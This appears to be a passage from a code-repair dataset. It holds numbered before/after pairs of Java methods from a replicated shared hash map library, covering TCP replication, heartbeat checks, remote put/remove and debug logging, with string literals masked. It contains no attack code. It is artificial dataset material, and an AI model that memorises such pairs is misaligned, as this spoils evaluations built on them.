      attached.remoteModificationIterator=map.acquireModificationIterator(remoteIdentifier);
      attached.entryWriter.timestampToBuffer(map.lastModificationTime(remoteIdentifier));
    }
  }
  if (attached.remoteIdentifier != Byte.MIN_VALUE && attached.remoteTimestamp == Long.MIN_VALUE) {
    attached.remoteTimestamp=attached.entryReader.timeStampFromBuffer();
    if (attached.remoteTimestamp != Long.MIN_VALUE) {
      attached.remoteModificationIterator.dirtyEntries(attached.remoteTimestamp);
      attached.setHandShakingComplete();
      attached.entryReader.entriesFromBuffer();
    }
  }
}"
91325,"/** 
 * @param serializedEntrySize the maximum size of an entry include the meta data
 * @param externalizable      supports reading and writing serialize entries
 * @param packetSize          the estimated size of a tcp/ip packet
 */
TcpSocketChannelEntryReader(final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,final short packetSize){
  this.serializedEntrySize=serializedEntrySize;
  in=ByteBuffer.allocate(packetSize + serializedEntrySize);
  this.externalizable=externalizable;
  out=new ByteBufferBytes(in);
  out.limit(0);
  in.clear();
}","/** 
 * @param serializedEntrySize the maximum size of an entry include the meta data
 * @param externalizable      supports reading and writing serialize entries
 * @param packetSize          the estimated size of a tcp/ip packet
 */
private TcpSocketChannelEntryReader(final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,final short packetSize){
  this.serializedEntrySize=serializedEntrySize;
  in=ByteBuffer.allocate(packetSize + serializedEntrySize);
  this.externalizable=externalizable;
  out=new ByteBufferBytes(in);
  out.limit(0);
  in.clear();
}"
91326,"private void checkHeartbeat(SelectionKey key,final long timeOutTime,final byte identifier,final Queue<SelectableChannel> pendingRegistrations) throws ConnectException {
  final Attached attached=(Attached)key.attachment();
  if (key.channel() == serverSocketChannel || attached == null)   return;
  final SocketChannel channel=(SocketChannel)key.channel();
  final long lastHeartBeat=attached.entryReader.lastHeartBeatReceived;
  if (timeOutTime > lastHeartBeat) {
    connector.asyncReconnect(identifier,channel.socket(),pendingRegistrations);
    throw new ConnectException(""String_Node_Str"" + attached.remoteIdentifier + ""String_Node_Str"");
  }
}","private void checkHeartbeat(SelectionKey key,final long timeOutTime,final byte identifier,final Queue<SelectableChannel> pendingRegistrations) throws ConnectException {
  final Attached attached=(Attached)key.attachment();
  if (key.channel() == serverSocketChannel || attached == null)   return;
  final SocketChannel channel=(SocketChannel)key.channel();
  if (timeOutTime > attached.entryReader.lastHeartBeatReceived) {
    connector.asyncReconnect(identifier,channel.socket(),pendingRegistrations);
    throw new ConnectException(""String_Node_Str"" + attached.remoteIdentifier + ""String_Node_Str"");
  }
}"
91327,"static <T extends SharedHashMap<Integer,CharSequence>>T newTcpSocketShmIntString(final byte identifier,final int serverPort,final InetSocketAddress... InetSocketAddress) throws IOException {
  final TcpReplication tcpReplication=new TcpReplication(serverPort,InetSocketAddress).heartBeatInterval(1000);
  return (T)new SharedHashMapBuilder().entries(1000).identifier(identifier).tcpReplication(tcpReplication).create(getPersistenceFile(),Integer.class,CharSequence.class);
}","static <T extends SharedHashMap<Integer,CharSequence>>T newTcpSocketShmIntString(final byte identifier,final int serverPort,final InetSocketAddress... InetSocketAddress) throws IOException {
  final TcpReplication tcpReplication=new TcpReplication(serverPort,InetSocketAddress).heartBeatInterval(1000);
  return (T)new SharedHashMapBuilder().entries(1000).identifier(identifier).tcpReplication(tcpReplication).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}"
91328,"@Test public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    map1.put(i,""String_Node_Str"");
  }
  waitTillEqual(5000);
  assertEquals(map1,map2);
  assertTrue(!map2.isEmpty());
}","@Test public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < map1.builder().entries(); i++) {
    map1.put(i,""String_Node_Str"");
  }
  waitTillEqual(5000);
  assertEquals(map1,map2);
  assertTrue(!map2.isEmpty());
}"
91329,"/** 
 * called from a remote node as part of replication
 */
private void remoteRemove(Bytes keyBytes,int hash2,final long timestamp,final byte identifier){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveAndDeleted.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveAndDeleted.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long timeStampPos=entry.position();
      if (shouldIgnore(entry,timestamp,identifier)) {
        entry.skip(1);
        return;
      }
      boolean wasDeleted=entry.readBoolean();
      if (!wasDeleted)       hashLookupLiveOnly.remove(hash2,pos);
      decrementSize();
      entry.position(timeStampPos);
      entry.writeLong(timestamp);
      if (identifier <= 0)       throw new IllegalStateException(""String_Node_Str"" + identifier);
      entry.writeByte(identifier);
      entry.writeBoolean(true);
    }
  }
  finally {
    unlock();
  }
}","/** 
 * called from a remote node as part of replication
 */
private void remoteRemove(Bytes keyBytes,int hash2,final long timestamp,final byte identifier){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveAndDeleted.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveAndDeleted.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      long timeStampPos=entry.position();
      if (shouldIgnore(entry,timestamp,identifier)) {
        entry.skip(1);
        return;
      }
      boolean wasDeleted=entry.readBoolean();
      if (!wasDeleted) {
        hashLookupLiveOnly.remove(hash2,pos);
        decrementSize();
      }
      entry.position(timeStampPos);
      entry.writeLong(timestamp);
      if (identifier <= 0)       throw new IllegalStateException(""String_Node_Str"" + identifier);
      entry.writeByte(identifier);
      entry.writeBoolean(true);
    }
  }
  finally {
    unlock();
  }
}"
91330,"public SharedHashMapBuilder identifier(byte identifier){
  if (canReplicate)   VanillaSharedReplicatedHashMap.checkIdentifier(identifier);
  this.identifier=identifier;
  return this;
}","public SharedHashMapBuilder identifier(byte identifier){
  this.identifier=identifier;
  return this;
}"
91331,"/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#remove(net.openhft.lang.io.Bytes,Object,Object,int)
 */
public V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2,long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveOnly.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (canReplicate) {
        if (shouldIgnore(entry,timestamp,localIdentifier))         return null;
        entry.skip(1);
      }
      return onKeyPresentOnReplace(key,expectedValue,newValue,pos,offset,entry);
    }
    return null;
  }
  finally {
    unlock();
  }
}","/** 
 * @see net.openhft.collections.VanillaSharedHashMap.Segment#remove(net.openhft.lang.io.Bytes,Object,Object,int)
 */
public V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2,long timestamp){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookupLiveOnly.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveOnly.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (canReplicate) {
        if (shouldIgnore(entry,timestamp,localIdentifier))         return null;
        entry.skip(1);
      }
      return onKeyPresentOnReplace(key,expectedValue,newValue,pos,offset,entry,hashLookupLiveOnly);
    }
    return null;
  }
  finally {
    unlock();
  }
}"
91332,"V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent,final byte identifier,final long timestamp){
  lock();
  try {
    IntIntMultiMap hashLookup=hashLookupLiveAndDeleted;
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    int pos;
    while ((pos=hashLookup.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      final long timeStampPos=entry.positionAddr();
      boolean wasDeleted=false;
      if (canReplicate) {
        if (shouldIgnore(entry,timestamp,identifier))         return null;
        wasDeleted=entry.readBoolean();
      }
      if (replaceIfPresent || wasDeleted) {
        if (canReplicate) {
          entry.positionAddr(timeStampPos);
          entry.writeLong(timestamp);
          entry.writeByte(identifier);
          entry.writeBoolean(false);
        }
        final V prevValue=replaceValueOnPut(key,value,entry,pos,offset);
        if (wasDeleted) {
          hashLookupLiveOnly.put(hash2,pos);
          incrementSize();
          return null;
        }
 else {
          return prevValue;
        }
      }
 else {
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,hash2,value,false,identifier,timestamp,hashLookup);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}","V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent,final byte identifier,final long timestamp){
  lock();
  try {
    IntIntMultiMap hashLookup=hashLookupLiveAndDeleted;
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    int pos;
    while ((pos=hashLookup.nextPos()) >= 0) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      final long timeStampPos=entry.positionAddr();
      boolean wasDeleted=false;
      if (canReplicate) {
        if (shouldIgnore(entry,timestamp,identifier))         return null;
        wasDeleted=entry.readBoolean();
      }
      if (replaceIfPresent || wasDeleted) {
        if (canReplicate) {
          entry.positionAddr(timeStampPos);
          entry.writeLong(timestamp);
          entry.writeByte(identifier);
          entry.writeBoolean(false);
        }
        final V prevValue=replaceValueOnPut(key,value,entry,pos,offset,!wasDeleted && !putReturnsNull,hashLookup);
        if (wasDeleted) {
          hashLookupLiveOnly.put(hash2,pos);
          incrementSize();
          return null;
        }
 else {
          return prevValue;
        }
      }
 else {
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,hash2,value,false,identifier,timestamp,hashLookup);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}"
91333,"/** 
 * called from a remote node when it wishes to propagate a remove event
 */
private void remotePut(@NotNull final Bytes inBytes,int hash2,final byte identifier,final long timestamp,long valuePos,long valueLimit,long keyPosition,long keyLimit){
  lock();
  try {
    final long keyLen=keyLimit - keyPosition;
    hashLookupLiveAndDeleted.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveAndDeleted.nextPos()) >= 0; ) {
      inBytes.limit(keyLimit);
      inBytes.position(keyPosition);
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(inBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      final long timeStampPos=entry.positionAddr();
      entry.positionAddr(timeStampPos);
      if (shouldIgnore(entry,timestamp,identifier)) {
        entry.positionAddr(timeStampPos);
        return;
      }
      boolean wasDeleted=entry.readBoolean();
      entry.positionAddr(timeStampPos);
      entry.writeLong(timestamp);
      if (identifier <= 0)       throw new IllegalStateException(""String_Node_Str"" + identifier);
      entry.writeByte(identifier);
      entry.writeBoolean(false);
      long valueLenPos=entry.position();
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      inBytes.limit(valueLimit);
      inBytes.position(valuePos);
      putValue(pos,offset,entry,valueLenPos,entryEndAddr,inBytes,null,true);
      if (wasDeleted) {
        hashLookupLiveOnly.put(hash2,pos);
        incrementSize();
      }
      return;
    }
    long valueLen=valueLimit - valuePos;
    int pos=alloc(inBlocks(entrySize(keyLen,valueLen)));
    long offset=offsetFromPos(pos);
    clearMetaData(offset);
    NativeBytes entry=entry(offset);
    entry.writeStopBit(keyLen);
    inBytes.limit(keyLimit);
    inBytes.position(keyPosition);
    entry.write(inBytes);
    entry.writeLong(timestamp);
    entry.writeByte(identifier);
    entry.writeBoolean(false);
    entry.writeStopBit(valueLen);
    alignment.alignPositionAddr(entry);
    inBytes.limit(valueLimit);
    inBytes.position(valuePos);
    entry.write(inBytes);
    hashLookupLiveAndDeleted.putAfterFailedSearch(pos);
    hashLookupLiveOnly.put(hash2,pos);
    incrementSize();
  }
  finally {
    unlock();
  }
}","/** 
 * called from a remote node when it wishes to propagate a remove event
 */
private void remotePut(@NotNull final Bytes inBytes,int hash2,final byte identifier,final long timestamp,long valuePos,long valueLimit,long keyPosition,long keyLimit){
  lock();
  try {
    final long keyLen=keyLimit - keyPosition;
    hashLookupLiveAndDeleted.startSearch(hash2);
    for (int pos; (pos=hashLookupLiveAndDeleted.nextPos()) >= 0; ) {
      inBytes.limit(keyLimit);
      inBytes.position(keyPosition);
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(inBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      final long timeStampPos=entry.positionAddr();
      entry.positionAddr(timeStampPos);
      if (shouldIgnore(entry,timestamp,identifier)) {
        entry.positionAddr(timeStampPos);
        return;
      }
      boolean wasDeleted=entry.readBoolean();
      entry.positionAddr(timeStampPos);
      entry.writeLong(timestamp);
      if (identifier <= 0)       throw new IllegalStateException(""String_Node_Str"" + identifier);
      entry.writeByte(identifier);
      entry.writeBoolean(false);
      long valueLenPos=entry.position();
      long valueLen=readValueLen(entry);
      long entryEndAddr=entry.positionAddr() + valueLen;
      inBytes.limit(valueLimit);
      inBytes.position(valuePos);
      putValue(pos,offset,entry,valueLenPos,entryEndAddr,inBytes,null,true,hashLookupLiveAndDeleted);
      if (wasDeleted) {
        hashLookupLiveOnly.put(hash2,pos);
        incrementSize();
      }
      return;
    }
    long valueLen=valueLimit - valuePos;
    int pos=alloc(inBlocks(entrySize(keyLen,valueLen)));
    long offset=offsetFromPos(pos);
    clearMetaData(offset);
    NativeBytes entry=entry(offset);
    entry.writeStopBit(keyLen);
    inBytes.limit(keyLimit);
    inBytes.position(keyPosition);
    entry.write(inBytes);
    entry.writeLong(timestamp);
    entry.writeByte(identifier);
    entry.writeBoolean(false);
    entry.writeStopBit(valueLen);
    alignment.alignPositionAddr(entry);
    inBytes.limit(valueLimit);
    inBytes.position(valuePos);
    entry.write(inBytes);
    hashLookupLiveAndDeleted.putAfterFailedSearch(pos);
    hashLookupLiveOnly.put(hash2,pos);
    incrementSize();
  }
  finally {
    unlock();
  }
}"
91334,"@Override void replacePosInHashLookupOnRelocation(int prevPos,int pos){
  hashLookupLiveAndDeleted.replacePrevPos(pos);
  int hash=hashLookupLiveAndDeleted.getSearchHash();
  hashLookupLiveOnly.replace(hash,prevPos,pos);
}","@Override void replacePosInHashLookupOnRelocation(IntIntMultiMap searchedHashLookup,int prevPos,int pos){
  searchedHashLookup.replacePrevPos(pos);
  int hash=searchedHashLookup.getSearchHash();
  IntIntMultiMap anotherLookup=searchedHashLookup == hashLookupLiveAndDeleted ? hashLookupLiveOnly : hashLookupLiveAndDeleted;
  anotherLookup.replace(hash,prevPos,pos);
}"
91335,"V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (replaceIfPresent) {
        return replaceValueOnPut(key,value,entry,pos,offset);
      }
 else {
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,value,false);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}","V put(Bytes keyBytes,K key,V value,int hash2,boolean replaceIfPresent){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      if (replaceIfPresent) {
        return replaceValueOnPut(key,value,entry,pos,offset,!putReturnsNull,hashLookup);
      }
 else {
        return putReturnsNull ? null : readValue(entry,null);
      }
    }
    long offset=putEntry(keyBytes,value,false);
    incrementSize();
    notifyPut(offset,true,key,value,posFromOffset(offset));
    return null;
  }
  finally {
    unlock();
  }
}"
91336,"/** 
 * Replaces value in existing entry. May cause entry relocation, because there may be not enough space for new value in location already allocated for this entry.
 * @param pos             index of the first block occupied by the entry
 * @param offset          relative offset of the entry in Segment bytes(before, i. e. including metaData)
 * @param entry           relative pointer in Segment bytes
 * @param valueLenPos     relative position of value ""stop bit"" in entry
 * @param entryEndAddr    absolute address of the entry end
 * @param valueBytes      serialized value, or {@code null} if valueAsByteable is given
 * @param valueAsByteable the value to put as {@code Byteable}, or   {@code null} if valueBytes is given
 * @param allowOversize   {@code true} if the entry is allowed become oversizedif it was not yet
 * @return relative offset of the entry in Segment bytes after putting value(that may cause entry relocation)
 */
long putValue(int pos,long offset,NativeBytes entry,long valueLenPos,long entryEndAddr,@Nullable Bytes valueBytes,@Nullable Byteable valueAsByteable,boolean allowOversize){
}","/** 
 * Replaces value in existing entry. May cause entry relocation, because there may be not enough space for new value in location already allocated for this entry.
 * @param pos             index of the first block occupied by the entry
 * @param offset          relative offset of the entry in Segment bytes(before, i. e. including metaData)
 * @param entry           relative pointer in Segment bytes
 * @param valueLenPos     relative position of value ""stop bit"" in entry
 * @param entryEndAddr    absolute address of the entry end
 * @param valueBytes      serialized value, or {@code null} if valueAsByteable is given
 * @param valueAsByteable the value to put as {@code Byteable}, or   {@code null} if valueBytes is given
 * @param allowOversize   {@code true} if the entry is allowed become oversizedif it was not yet
 * @return relative offset of the entry in Segment bytes after putting value(that may cause entry relocation)
 */
long putValue(int pos,long offset,NativeBytes entry,long valueLenPos,long entryEndAddr,@Nullable Bytes valueBytes,@Nullable Byteable valueAsByteable,boolean allowOversize,IntIntMultiMap searchedHashLookup){
}"
91337,"V onKeyPresentOnReplace(K key,V expectedValue,V newValue,int pos,long offset,NativeBytes entry){
  long valueLenPos=entry.position();
  long valueLen=readValueLen(entry);
  long entryEndAddr=entry.positionAddr() + valueLen;
  V valueRead=readValue(entry,null,valueLen);
  if (valueRead == null)   return null;
  if (expectedValue == null || expectedValue.equals(valueRead)) {
    offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,newValue);
    notifyPut(offset,false,key,newValue,posFromOffset(offset));
    return valueRead;
  }
  return null;
}","V onKeyPresentOnReplace(K key,V expectedValue,V newValue,int pos,long offset,NativeBytes entry,IntIntMultiMap searchedHashLookup){
  long valueLenPos=entry.position();
  long valueLen=readValueLen(entry);
  long entryEndAddr=entry.positionAddr() + valueLen;
  V valueRead=readValue(entry,null,valueLen);
  if (valueRead == null)   return null;
  if (expectedValue == null || expectedValue.equals(valueRead)) {
    offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,newValue,searchedHashLookup);
    notifyPut(offset,false,key,newValue,posFromOffset(offset));
    return valueRead;
  }
  return null;
}"
91338,"void replacePosInHashLookupOnRelocation(int prevPos,int pos){
  hashLookup.replacePrevPos(pos);
}","void replacePosInHashLookupOnRelocation(IntIntMultiMap searchedHashLookup,int prevPos,int pos){
  searchedHashLookup.replacePrevPos(pos);
}"
91339,"/** 
 * Replaces the specified value for the key with the given value. <p/>  {@code newValue} is set only if the existing value correspondingto the specified key is equal to  {@code expectedValue}or   {@code expectedValue == null}.
 * @param hash2 a hash code related to the {@code keyBytes}
 * @return the replaced value or {@code null} if the value was not replaced
 */
V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      return onKeyPresentOnReplace(key,expectedValue,newValue,pos,offset,entry);
    }
    return null;
  }
  finally {
    unlock();
  }
}","/** 
 * Replaces the specified value for the key with the given value. <p/>  {@code newValue} is set only if the existing value correspondingto the specified key is equal to  {@code expectedValue}or   {@code expectedValue == null}.
 * @param hash2 a hash code related to the {@code keyBytes}
 * @return the replaced value or {@code null} if the value was not replaced
 */
V replace(Bytes keyBytes,K key,V expectedValue,V newValue,int hash2){
  lock();
  try {
    long keyLen=keyBytes.remaining();
    hashLookup.startSearch(hash2);
    for (int pos; (pos=hashLookup.nextPos()) >= 0; ) {
      long offset=offsetFromPos(pos);
      NativeBytes entry=entry(offset);
      if (!keyEquals(keyBytes,keyLen,entry))       continue;
      entry.skip(keyLen);
      return onKeyPresentOnReplace(key,expectedValue,newValue,pos,offset,entry,hashLookup);
    }
    return null;
  }
  finally {
    unlock();
  }
}"
91340,"V replaceValueOnPut(K key,V value,NativeBytes entry,int pos,long offset){
  long valueLenPos=entry.position();
  long valueLen=readValueLen(entry);
  long entryEndAddr=entry.positionAddr() + valueLen;
  V prevValue=null;
  if (!putReturnsNull)   prevValue=readValue(entry,null,valueLen);
  offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,value);
  notifyPut(offset,false,key,value,posFromOffset(offset));
  return prevValue;
}","V replaceValueOnPut(K key,V value,NativeBytes entry,int pos,long offset,boolean readPrevValue,IntIntMultiMap searchedHashLookup){
  long valueLenPos=entry.position();
  long valueLen=readValueLen(entry);
  long entryEndAddr=entry.positionAddr() + valueLen;
  V prevValue=null;
  if (readPrevValue)   prevValue=readValue(entry,null,valueLen);
  offset=putValue(pos,offset,entry,valueLenPos,entryEndAddr,value,searchedHashLookup);
  notifyPut(offset,false,key,value,posFromOffset(offset));
  return prevValue;
}"
91341,"/** 
 * Dirties all entries with a modification time newer than   {@code timeStamp} ( inclusive )<p/> This functionality is used to publish recently modified entries to a new remote node as it connects
 * @param timeStamp the timestamp ( up to and including ) from which all entries should be dirty
 */
void dirtyEntries(long timeStamp);","void dirtyEntries(long timeStamp,EntryModifiableCallback entryModifiableCallback);"
91342,"/** 
 * {@inheritDoc}
 */
@Override public void readExternalEntry(@NotNull Bytes source){
  final long keyLen=source.readStopBit();
  final long valueLen=source.readStopBit();
  final long timeStamp=source.readStopBit();
  final byte id=source.readByte();
  final byte remoteIdentifier;
  final boolean isDeleted;
  if (id < 0) {
    isDeleted=true;
    remoteIdentifier=(byte)-id;
  }
 else {
    isDeleted=false;
    remoteIdentifier=id;
  }
  final long keyPosition=source.position();
  final long keyLimit=source.position() + keyLen;
  source.limit(keyLimit);
  long hash=Hasher.hash(source);
  int segmentNum=hasher.getSegment(hash);
  int segmentHash=hasher.segmentHash(hash);
  if (isDeleted) {
    System.out.println(""String_Node_Str"" + localIdentifier + ""String_Node_Str""+ remoteIdentifier+ ""String_Node_Str""+ ByteUtils.toCharSequence(source).trim()+ ""String_Node_Str"");
    segment(segmentNum).remoteRemove(source,segmentHash,timeStamp,remoteIdentifier);
    return;
  }
  final String message=""String_Node_Str"" + localIdentifier + ""String_Node_Str""+ remoteIdentifier+ ""String_Node_Str""+ ByteUtils.toCharSequence(source).trim()+ ""String_Node_Str"";
  final long valuePosition=keyLimit;
  final long valueLimit=valuePosition + valueLen;
  segment(segmentNum).remotePut(source,segmentHash,remoteIdentifier,timeStamp,valuePosition,valueLimit,keyPosition,keyLimit);
  source.position(valuePosition);
  source.limit(valueLimit);
  System.out.println(message + ""String_Node_Str"" + ByteUtils.toCharSequence(source).trim()+ ""String_Node_Str"");
}","/** 
 * {@inheritDoc}
 */
@Override public void readExternalEntry(@NotNull Bytes source){
  final long keyLen=source.readStopBit();
  final long valueLen=source.readStopBit();
  final long timeStamp=source.readStopBit();
  final byte id=source.readByte();
  final byte remoteIdentifier;
  final boolean isDeleted;
  if (id < 0) {
    isDeleted=true;
    remoteIdentifier=(byte)-id;
  }
 else {
    isDeleted=false;
    remoteIdentifier=id;
  }
  final long keyPosition=source.position();
  final long keyLimit=source.position() + keyLen;
  source.limit(keyLimit);
  long hash=Hasher.hash(source);
  int segmentNum=hasher.getSegment(hash);
  int segmentHash=hasher.segmentHash(hash);
  if (isDeleted) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"" + localIdentifier + ""String_Node_Str""+ remoteIdentifier+ ""String_Node_Str""+ ByteUtils.toCharSequence(source).trim()+ ""String_Node_Str"");
    segment(segmentNum).remoteRemove(source,segmentHash,timeStamp,remoteIdentifier);
    return;
  }
  String message=null;
  if (LOG.isDebugEnabled()) {
    message=""String_Node_Str"" + localIdentifier + ""String_Node_Str""+ remoteIdentifier+ ""String_Node_Str""+ ByteUtils.toCharSequence(source).trim()+ ""String_Node_Str"";
  }
  final long valuePosition=keyLimit;
  final long valueLimit=valuePosition + valueLen;
  segment(segmentNum).remotePut(source,segmentHash,remoteIdentifier,timeStamp,valuePosition,valueLimit,keyPosition,keyLimit);
  source.position(valuePosition);
  source.limit(valueLimit);
  if (LOG.isDebugEnabled()) {
    LOG.debug(message + ""String_Node_Str"" + ByteUtils.toCharSequence(source).trim()+ ""String_Node_Str"");
  }
}"
91343,"@Override public void accept(int hash,int pos){
  final long offset=offsetFromPos(pos);
  final NativeBytes entry=entry(offset);
  long keyLen=entry.readStopBit();
  entry.skip(keyLen);
  final long entryTimestamp=entry.readLong();
  if (entryTimestamp >= timeStamp && entry.readByte() == VanillaSharedReplicatedHashMap.this.getIdentifier())   entryModifiableCallback.set(index,pos);
}","@Override public void accept(int hash,int pos){
  final NativeBytes entry=entry(offsetFromPos(pos));
  long keyLen=entry.readStopBit();
  entry.skip(keyLen);
  final long entryTimestamp=entry.readLong();
  if (entryTimestamp >= timeStamp && entry.readByte() == VanillaSharedReplicatedHashMap.this.getIdentifier())   entryModifiableCallback.set(index,pos);
}"
91344,"/** 
 * {@inheritDoc}
 */
public void writeExternalEntry(@NotNull NativeBytes entry,@NotNull Bytes destination){
  final long limt=entry.limit();
  final long keyLen=entry.readStopBit();
  final long keyPosition=entry.position();
  entry.skip(keyLen);
  final long keyLimit=entry.position();
  final long timeStamp=entry.readLong();
  final byte identifier=entry.readByte();
  if (identifier != localIdentifier) {
    return;
  }
  final boolean isDeleted=entry.readBoolean();
  long valueLen=isDeleted ? 0 : entry.readStopBit();
  final long position=entry.position();
  destination.writeStopBit(keyLen);
  destination.writeStopBit(valueLen);
  destination.writeStopBit(timeStamp);
  if (isDeleted)   destination.writeByte(-identifier);
 else   destination.writeByte(identifier);
  entry.limit(keyLimit);
  entry.position(keyPosition);
  destination.write(entry);
  if (isDeleted || valueLen == 0)   return;
  entry.limit(limt);
  entry.position(position);
  alignment.alignPositionAddr(entry);
  entry.limit(entry.position() + valueLen);
  destination.write(entry);
}","/** 
 * {@inheritDoc}
 */
public void writeExternalEntry(@NotNull NativeBytes entry,@NotNull Bytes destination){
  final long limt=entry.limit();
  final long keyLen=entry.readStopBit();
  final long keyPosition=entry.position();
  entry.skip(keyLen);
  final long keyLimit=entry.position();
  final long timeStamp=entry.readLong();
  final byte identifier=entry.readByte();
  if (identifier != localIdentifier) {
    return;
  }
  final boolean isDeleted=entry.readBoolean();
  long valueLen=isDeleted ? 0 : entry.readStopBit();
  final long position=entry.position();
  destination.writeStopBit(keyLen);
  destination.writeStopBit(valueLen);
  destination.writeStopBit(timeStamp);
  if (isDeleted)   destination.writeByte(-identifier);
 else   destination.writeByte(identifier);
  entry.limit(keyLimit);
  entry.position(keyPosition);
  destination.write(entry);
  String message=null;
  if (LOG.isDebugEnabled()) {
    if (isDeleted || valueLen == 0)     LOG.debug(""String_Node_Str"" + localIdentifier + ""String_Node_Str""+ ByteUtils.toCharSequence(entry).trim()+ ""String_Node_Str"");
 else     message=""String_Node_Str"" + localIdentifier + ""String_Node_Str""+ ByteUtils.toCharSequence(entry).trim()+ ""String_Node_Str"";
  }
  if (isDeleted || valueLen == 0)   return;
  entry.limit(limt);
  entry.position(position);
  alignment.alignPositionAddr(entry);
  entry.limit(entry.position() + valueLen);
  destination.write(entry);
  if (LOG.isDebugEnabled()) {
    LOG.debug(message + ""String_Node_Str"" + ByteUtils.toCharSequence(entry).trim()+ ""String_Node_Str"");
  }
}"
91345,"@Override public void dirtyEntries(long timeStamp){
  for (  final Segment segment : (Segment[])segments) {
    segment.dirtyNewerEntries(timeStamp,entryModifiableCallback);
  }
}","@Override public void dirtyEntries(long timeStamp){
  for (  final Segment segment : (Segment[])segments) {
    segment.dirtyEntries(timeStamp,entryModifiableCallback);
  }
}"
91346,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
